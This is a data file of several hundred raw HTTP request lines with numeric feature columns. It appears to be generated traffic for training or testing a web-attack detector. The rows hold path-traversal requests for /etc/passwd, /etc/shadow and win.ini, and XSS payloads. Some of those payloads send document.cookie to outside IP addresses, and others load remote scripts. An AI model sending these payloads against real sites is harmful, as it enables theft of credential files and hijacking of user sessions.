48,1,200,7429,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,4373,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3032,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
48,1,200,3993,7,19,12,6,3,GET get.php?file=../../../../etc/passwd HTTP/1.1
35,1,200,6928,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7542,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,1664,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3012,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5480,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,7116,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5557,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,3608,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6002,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,6665,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
35,1,200,5271,7,9,9,6,3,GET ../../../../etc/shadow HTTP/1.1
83,1,200,2141,8,32,16,6,2,GET /?search=<script>%window.open('http://147.224.38.30/852122')3C/script> HTTP/1.1
44,1,200,2899,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4811,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,3259,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7343,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5557,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,5721,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,2848,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4858,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,4584,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,6494,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,2684,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
44,1,200,7984,7,11,14,1,3,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1
49,1,200,2806,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3292,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4415,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3574,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3641,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,7749,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5894,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6003,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6027,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5677,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3514,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5712,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3207,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,1101,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,1221,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4058,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,5314,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6902,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6924,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
35,1,200,3734,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,4495,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2013,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1658,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1795,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,5145,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2850,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2887,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,7625,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,1300,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,3002,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,5782,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
35,1,200,2317,7,9,9,6,3,GET ../../../../etc/passwd HTTP/1.1
80,1,200,5382,8,30,16,6,2,GET /?file=<script>%window.open('http://22.53.33.116/328758')3C/script> HTTP/1.1
84,1,200,1741,8,32,16,6,2,GET /?search=<script>%window.open('http://161.181.157.52/793879')3C/script> HTTP/1.1
79,1,200,6323,7,28,17,6,2,GET /?p=<script><script+src="http://193.35.149.44/253638.js=></script> HTTP/1.1
82,1,200,4195,7,33,17,6,2,GET /?search=<script><script+src="http://25.21.70.96/704010.js=></script> HTTP/1.1
82,1,200,3269,7,33,17,6,2,GET /?search=<script><script+src="http://43.171.56.2/327778.js=></script> HTTP/1.1
81,1,200,1531,8,30,16,6,2,GET /?name=<script>%window.open('http://176.37.17.143/990910')3C/script> HTTP/1.1
102,1,200,5861,7,54,19,6,2,GET /?file=<script>window.location='http://231.117.234.126/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,3131,8,30,16,6,2,GET /?file=<script>%window.open('http://238.121.83.126/561843')3C/script> HTTP/1.1
84,1,200,3661,7,33,17,6,2,GET /?search=<script><script+src="http://228.237.22.96/714175.js=></script> HTTP/1.1
81,1,200,6179,7,31,17,6,2,GET /?name=<script><script+src="http://136.113.2.75/793520.js=></script> HTTP/1.1
83,1,200,3795,7,40,14,5,2,GET /?search=<script>window.location.href="http://150.51.131.226"</script> HTTP/1.1
82,1,200,4901,7,31,17,6,2,GET /?file=<script><script+src="http://106.205.39.60/275949.js=></script> HTTP/1.1
102,1,200,6897,7,54,19,6,2,GET /?file=<script>window.location='http://245.227.247.224/?cookie='+document.cookie</script> HTTP/1.1
102,1,200,7243,7,56,19,6,2,GET /?search=<script>window.location='http://169.92.225.65/?cookie='+document.cookie</script> HTTP/1.1
75,1,200,1023,7,35,14,5,2,GET /?p=<script>window.location.href="http://92.95.9.126"</script> HTTP/1.1
102,1,200,6061,7,56,19,6,2,GET /?search=<script>window.location='http://181.247.77.73/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,5946,7,51,19,6,2,GET /?p=<script>window.location='http://62.221.202.223/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,5274,7,38,14,5,2,GET /?name=<script>window.location.href="http://65.192.115.41"</script> HTTP/1.1
96,1,200,7478,7,51,19,6,2,GET /?p=<script>window.location='http://63.226.30.69/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,6179,7,28,17,6,2,GET /?p=<script><script+src="http://128.46.178.1/762561.js=></script> HTTP/1.1
50,1,200,1201,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,6621,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1397,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2363,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5419,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,6375,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4206,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,6505,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5070,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,5841,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2080,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7642,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,2633,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,7634,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1399,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4280,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4030,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,4510,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
50,1,200,1203,7,21,12,6,3,GET get-files?file=../../../../etc/passwd HTTP/1.1
99,1,200,5773,7,54,19,6,2,GET /?file=<script>window.location='http://239.41.40.53/?cookie='+document.cookie</script> HTTP/1.1
61,1,200,2378,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,5983,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3566,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,4993,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2392,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3723,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,7232,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2680,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,4189,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,6943,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2265,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,6328,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,7388,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1338,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2607,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
99,1,200,5146,7,54,19,6,2,GET /?name=<script>window.location='http://99.233.31.62/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,6605,7,38,14,5,2,GET /?file=<script>window.location.href="http://253.146.246.47"</script> HTTP/1.1
84,1,200,3811,8,32,16,6,2,GET /?search=<script>%window.open('http://30.148.200.228/195737')3C/script> HTTP/1.1
77,1,200,2954,7,28,17,6,2,GET /?p=<script><script+src="http://91.63.242.75/76653.js=></script> HTTP/1.1
81,1,200,6255,7,31,17,6,2,GET /?name=<script><script+src="http://9.185.46.186/834313.js=></script> HTTP/1.1
103,1,200,6333,7,56,19,6,2,GET /?search=<script>window.location='http://128.105.27.164/?cookie='+document.cookie</script> HTTP/1.1
82,1,200,1628,8,30,16,6,2,GET /?file=<script>%window.open('http://192.203.237.66/515086')3C/script> HTTP/1.1
78,1,200,5966,8,27,16,6,2,GET /?p=<script>%window.open('http://164.36.241.15/836553')3C/script> HTTP/1.1
48,1,200,6736,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,3161,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1554,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4579,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,6001,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1268,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,5788,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,2624,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,7898,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,1112,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,4461,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
48,1,200,3372,7,19,12,6,3,GET get.php?file=../../../../etc/shadow HTTP/1.1
85,1,200,4683,8,32,16,6,2,GET /?search=<script>%window.open('http://170.149.248.169/153102')3C/script> HTTP/1.1
80,1,200,1793,8,30,16,6,2,GET /?file=<script>%window.open('http://34.142.75.40/934954')3C/script> HTTP/1.1
84,1,200,1742,8,32,16,6,2,GET /?search=<script>%window.open('http://204.246.236.55/649375')3C/script> HTTP/1.1
78,1,200,7547,7,35,14,5,2,GET /?p=<script>window.location.href="http://84.135.222.165"</script> HTTP/1.1
80,1,200,1480,8,30,16,6,2,GET /?file=<script>%window.open('http://81.94.84.250/288246')3C/script> HTTP/1.1
79,1,200,7846,7,28,17,6,2,GET /?p=<script><script+src="http://63.221.62.161/703525.js=></script> HTTP/1.1
100,1,200,1423,7,54,19,6,2,GET /?name=<script>window.location='http://250.3.104.235/?cookie='+document.cookie</script> HTTP/1.1
97,1,200,6146,7,51,19,6,2,GET /?p=<script>window.location='http://9.237.205.181/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,7988,8,27,16,6,2,GET /?p=<script>%window.open('http://22.11.255.233/463688')3C/script> HTTP/1.1
101,1,200,3589,7,54,19,6,2,GET /?name=<script>window.location='http://101.208.135.52/?cookie='+document.cookie</script> HTTP/1.1
81,1,200,4220,7,38,14,5,2,GET /?name=<script>window.location.href="http://56.102.154.156"</script> HTTP/1.1
81,1,200,6750,8,30,16,6,2,GET /?name=<script>%window.open('http://213.182.12.53/235998')3C/script> HTTP/1.1
81,1,200,6780,8,30,16,6,2,GET /?name=<script>%window.open('http://224.45.94.168/142143')3C/script> HTTP/1.1
79,1,200,2493,8,27,16,6,2,GET /?p=<script>%window.open('http://245.215.170.67/530499')3C/script> HTTP/1.1
83,1,200,6612,7,40,14,5,2,GET /?search=<script>window.location.href="http://176.221.132.23"</script> HTTP/1.1
101,1,200,3164,7,54,19,6,2,GET /?file=<script>window.location='http://92.113.117.169/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,5239,7,38,14,5,2,GET /?file=<script>window.location.href="http://169.188.82.86"</script> HTTP/1.1
84,1,200,2657,7,31,17,6,2,GET /?name=<script><script+src="http://169.113.105.250/753240.js=></script> HTTP/1.1
79,1,200,5960,7,28,17,6,2,GET /?p=<script><script+src="http://19.244.65.112/242655.js=></script> HTTP/1.1
84,1,200,7790,8,32,16,6,2,GET /?search=<script>%window.open('http://141.132.210.90/536411')3C/script> HTTP/1.1
80,1,200,4430,7,31,17,6,2,GET /?name=<script><script+src="http://37.134.67.53/45610.js=></script> HTTP/1.1
80,1,200,7355,7,38,14,5,2,GET /?file=<script>window.location.href="http://181.44.76.242"</script> HTTP/1.1
79,1,200,5502,7,35,14,5,2,GET /?p=<script>window.location.href="http://158.172.233.190"</script> HTTP/1.1
79,1,200,2471,7,28,17,6,2,GET /?p=<script><script+src="http://33.214.186.67/312396.js=></script> HTTP/1.1
79,1,200,1932,7,28,17,6,2,GET /?p=<script><script+src="http://235.141.217.6/858505.js=></script> HTTP/1.1
78,1,200,2892,7,35,14,5,2,GET /?p=<script>window.location.href="http://234.254.42.170"</script> HTTP/1.1
83,1,200,2424,7,31,17,6,2,GET /?file=<script><script+src="http://190.201.236.85/375019.js=></script> HTTP/1.1
85,1,200,1343,7,33,17,6,2,GET /?search=<script><script+src="http://135.55.208.169/605848.js=></script> HTTP/1.1
98,1,200,6371,7,51,19,6,2,GET /?p=<script>window.location='http://101.67.243.195/?cookie='+document.cookie</script> HTTP/1.1
76,1,200,5185,7,35,14,5,2,GET /?p=<script>window.location.href="http://42.157.7.241"</script> HTTP/1.1
80,1,200,5719,8,30,16,6,2,GET /?file=<script>%window.open('http://227.65.3.151/844724')3C/script> HTTP/1.1
79,1,200,1498,8,27,16,6,2,GET /?p=<script>%window.open('http://138.43.159.209/292162')3C/script> HTTP/1.1
85,1,200,5338,7,33,17,6,2,GET /?search=<script><script+src="http://112.224.119.59/130810.js=></script> HTTP/1.1
80,1,200,4008,8,30,16,6,2,GET /?name=<script>%window.open('http://125.91.110.177/1354')3C/script> HTTP/1.1
83,1,200,4423,7,33,17,6,2,GET /?search=<script><script+src="http://78.166.32.229/15447.js=></script> HTTP/1.1
83,1,200,4071,8,32,16,6,2,GET /?search=<script>%window.open('http://100.105.86.64/173152')3C/script> HTTP/1.1
82,1,200,7013,7,31,17,6,2,GET /?name=<script><script+src="http://218.100.89.28/237967.js=></script> HTTP/1.1
48,1,200,7928,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1126,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,1766,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,3948,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5834,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,6656,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,3490,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,3560,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,5894,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
48,1,200,2014,8,21,9,3,2,GET /?p=<script>%alert("xss")3C/script> HTTP/1.1
82,1,200,4207,7,40,14,5,2,GET /?search=<script>window.location.href="http://215.56.168.33"</script> HTTP/1.1
100,1,200,5944,7,54,19,6,2,GET /?name=<script>window.location='http://167.223.2.103/?cookie='+document.cookie</script> HTTP/1.1
77,1,200,5532,7,35,14,5,2,GET /?p=<script>window.location.href="http://214.161.11.56"</script> HTTP/1.1
77,1,200,6665,7,35,14,5,2,GET /?p=<script>window.location.href="http://183.13.196.45"</script> HTTP/1.1
80,1,200,3193,7,31,17,6,2,GET /?file=<script><script+src="http://97.31.201.3/267652.js=></script> HTTP/1.1
79,1,200,2231,7,28,17,6,2,GET /?p=<script><script+src="http://22.172.133.244/83327.js=></script> HTTP/1.1
80,1,200,6115,8,27,16,6,2,GET /?p=<script>%window.open('http://216.126.213.176/528352')3C/script> HTTP/1.1
81,1,200,7244,7,31,17,6,2,GET /?file=<script><script+src="http://5.188.210.13/397101.js=></script> HTTP/1.1
84,1,200,7024,7,33,17,6,2,GET /?search=<script><script+src="http://115.12.42.127/166286.js=></script> HTTP/1.1
78,1,200,4270,7,38,14,5,2,GET /?name=<script>window.location.href="http://3.53.63.150"</script> HTTP/1.1
81,1,200,6297,8,30,16,6,2,GET /?name=<script>%window.open('http://224.28.119.198/87647')3C/script> HTTP/1.1
102,1,200,6145,7,56,19,6,2,GET /?search=<script>window.location='http://31.135.86.198/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,6168,7,28,17,6,2,GET /?p=<script><script+src="http://25.152.231.40/398698.js=></script> HTTP/1.1
98,1,200,3082,7,51,19,6,2,GET /?p=<script>window.location='http://148.240.253.14/?cookie='+document.cookie</script> HTTP/1.1
75,1,200,6917,7,35,14,5,2,GET /?p=<script>window.location.href="http://95.93.85.99"</script> HTTP/1.1
83,1,200,1821,8,30,16,6,2,GET /?file=<script>%window.open('http://217.145.135.186/261092')3C/script> HTTP/1.1
102,1,200,7502,7,54,19,6,2,GET /?name=<script>window.location='http://109.201.104.128/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,1505,8,27,16,6,2,GET /?p=<script>%window.open('http://133.162.206.127/550099')3C/script> HTTP/1.1
97,1,200,4240,7,51,19,6,2,GET /?p=<script>window.location='http://98.18.101.208/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,5398,7,40,14,5,2,GET /?search=<script>window.location.href="http://138.144.20.161"</script> HTTP/1.1
85,1,200,1287,7,33,17,6,2,GET /?search=<script><script+src="http://11.159.193.134/188444.js=></script> HTTP/1.1
102,1,200,4676,7,54,19,6,2,GET /?file=<script>window.location='http://198.200.104.157/?cookie='+document.cookie</script> HTTP/1.1
99,1,200,3748,7,51,19,6,2,GET /?p=<script>window.location='http://191.167.214.112/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,6794,7,56,19,6,2,GET /?search=<script>window.location='http://103.198.35.3/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,4304,7,54,19,6,2,GET /?name=<script>window.location='http://246.231.15.100/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,7389,8,27,16,6,2,GET /?p=<script>%window.open('http://219.58.245.253/996828')3C/script> HTTP/1.1
97,1,200,3254,7,51,19,6,2,GET /?p=<script>window.location='http://41.145.163.21/?cookie='+document.cookie</script> HTTP/1.1
78,1,200,4383,7,35,14,5,2,GET /?p=<script>window.location.href="http://125.239.26.190"</script> HTTP/1.1
78,1,200,1320,7,38,14,5,2,GET /?file=<script>window.location.href="http://78.0.13.248"</script> HTTP/1.1
83,1,200,3279,7,40,14,5,2,GET /?search=<script>window.location.href="http://138.241.65.101"</script> HTTP/1.1
80,1,200,3492,7,28,17,6,2,GET /?p=<script><script+src="http://78.126.153.102/470896.js=></script> HTTP/1.1
84,1,200,6066,8,32,16,6,2,GET /?search=<script>%window.open('http://138.39.234.126/883729')3C/script> HTTP/1.1
80,1,200,2542,7,28,17,6,2,GET /?p=<script><script+src="http://222.182.154.41/877291.js=></script> HTTP/1.1
83,1,200,5345,7,33,17,6,2,GET /?search=<script><script+src="http://247.61.64.192/72627.js=></script> HTTP/1.1
78,1,200,2936,8,27,16,6,2,GET /?p=<script>%window.open('http://237.56.105.49/679860')3C/script> HTTP/1.1
81,1,200,6402,7,38,14,5,2,GET /?name=<script>window.location.href="http://141.212.67.245"</script> HTTP/1.1
81,1,200,2176,8,30,16,6,2,GET /?file=<script>%window.open('http://192.162.55.12/687877')3C/script> HTTP/1.1
83,1,200,3162,7,33,17,6,2,GET /?search=<script><script+src="http://93.79.72.168/154200.js=></script> HTTP/1.1
83,1,200,2715,8,32,16,6,2,GET /?search=<script>%window.open('http://243.245.58.86/673066')3C/script> HTTP/1.1
84,1,200,6594,8,32,16,6,2,GET /?search=<script>%window.open('http://39.204.115.214/686899')3C/script> HTTP/1.1
82,1,200,7628,8,30,16,6,2,GET /?name=<script>%window.open('http://185.176.113.52/237788')3C/script> HTTP/1.1
100,1,200,5684,7,54,19,6,2,GET /?name=<script>window.location='http://30.207.246.91/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,3034,8,30,16,6,2,GET /?name=<script>%window.open('http://5.141.219.32/447558')3C/script> HTTP/1.1
82,1,200,3929,7,40,14,5,2,GET /?search=<script>window.location.href="http://240.58.71.114"</script> HTTP/1.1
97,1,200,4795,7,51,19,6,2,GET /?p=<script>window.location='http://170.185.141.9/?cookie='+document.cookie</script> HTTP/1.1
80,1,200,2306,7,28,17,6,2,GET /?p=<script><script+src="http://160.99.173.178/270957.js=></script> HTTP/1.1
85,1,200,1004,8,32,16,6,2,GET /?search=<script>%window.open('http://156.149.138.247/793612')3C/script> HTTP/1.1
80,1,200,7598,7,28,17,6,2,GET /?p=<script><script+src="http://58.109.121.139/508858.js=></script> HTTP/1.1
85,1,200,7526,7,33,17,6,2,GET /?search=<script><script+src="http://111.151.154.27/936806.js=></script> HTTP/1.1
79,1,200,7662,8,27,16,6,2,GET /?p=<script>%window.open('http://144.248.117.183/28177')3C/script> HTTP/1.1
82,1,200,6580,8,32,16,6,2,GET /?search=<script>%window.open('http://131.17.167.12/19755')3C/script> HTTP/1.1
81,1,200,6251,7,38,14,5,2,GET /?name=<script>window.location.href="http://204.220.160.48"</script> HTTP/1.1
83,1,200,6878,7,40,14,5,2,GET /?search=<script>window.location.href="http://214.210.228.42"</script> HTTP/1.1
82,1,200,7416,8,30,16,6,2,GET /?file=<script>%window.open('http://216.243.100.71/686172')3C/script> HTTP/1.1
81,1,200,1299,7,38,14,5,2,GET /?name=<script>window.location.href="http://149.202.75.192"</script> HTTP/1.1
84,1,200,5342,7,33,17,6,2,GET /?search=<script><script+src="http://26.146.91.249/740225.js=></script> HTTP/1.1
81,1,200,7002,7,38,14,5,2,GET /?file=<script>window.location.href="http://73.112.140.212"</script> HTTP/1.1
99,1,200,7724,7,54,19,6,2,GET /?name=<script>window.location='http://0.132.223.32/?cookie='+document.cookie</script> HTTP/1.1
100,1,200,4522,7,54,19,6,2,GET /?name=<script>window.location='http://81.114.152.72/?cookie='+document.cookie</script> HTTP/1.1
98,1,200,5360,7,51,19,6,2,GET /?p=<script>window.location='http://255.165.74.154/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,3606,8,30,16,6,2,GET /?file=<script>%window.open('http://247.174.181.149/600627')3C/script> HTTP/1.1
81,1,200,4012,7,31,17,6,2,GET /?name=<script><script+src="http://78.225.181.204/4140.js=></script> HTTP/1.1
100,1,200,1060,7,54,19,6,2,GET /?name=<script>window.location='http://137.50.66.156/?cookie='+document.cookie</script> HTTP/1.1
83,1,200,5709,7,40,14,5,2,GET /?search=<script>window.location.href="http://19.211.216.121"</script> HTTP/1.1
82,1,200,2797,7,40,14,5,2,GET /?search=<script>window.location.href="http://151.206.1.132"</script> HTTP/1.1
97,1,200,5885,7,51,19,6,2,GET /?p=<script>window.location='http://5.228.200.193/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,7043,8,30,16,6,2,GET /?name=<script>%window.open('http://56.88.74.12/914818')3C/script> HTTP/1.1
82,1,200,6169,8,30,16,6,2,GET /?file=<script>%window.open('http://153.212.91.157/286788')3C/script> HTTP/1.1
78,1,200,4558,8,30,16,6,2,GET /?name=<script>%window.open('http://19.2.4.162/615563')3C/script> HTTP/1.1
79,1,200,6946,7,35,14,5,2,GET /?p=<script>window.location.href="http://166.204.252.186"</script> HTTP/1.1
82,1,200,2892,7,31,17,6,2,GET /?name=<script><script+src="http://72.205.255.93/842497.js=></script> HTTP/1.1
80,1,200,1333,7,28,17,6,2,GET /?p=<script><script+src="http://177.237.34.123/563467.js=></script> HTTP/1.1
100,1,200,7573,7,54,19,6,2,GET /?name=<script>window.location='http://152.176.21.72/?cookie='+document.cookie</script> HTTP/1.1
101,1,200,1310,7,56,19,6,2,GET /?search=<script>window.location='http://3.154.203.76/?cookie='+document.cookie</script> HTTP/1.1
79,1,200,1540,7,31,17,6,2,GET /?file=<script><script+src="http://235.9.2.66/366961.js=></script> HTTP/1.1
81,1,200,1154,7,38,14,5,2,GET /?name=<script>window.location.href="http://48.245.234.223"</script> HTTP/1.1
81,1,200,7819,7,31,17,6,2,GET /?file=<script><script+src="http://130.98.89.42/672217.js=></script> HTTP/1.1
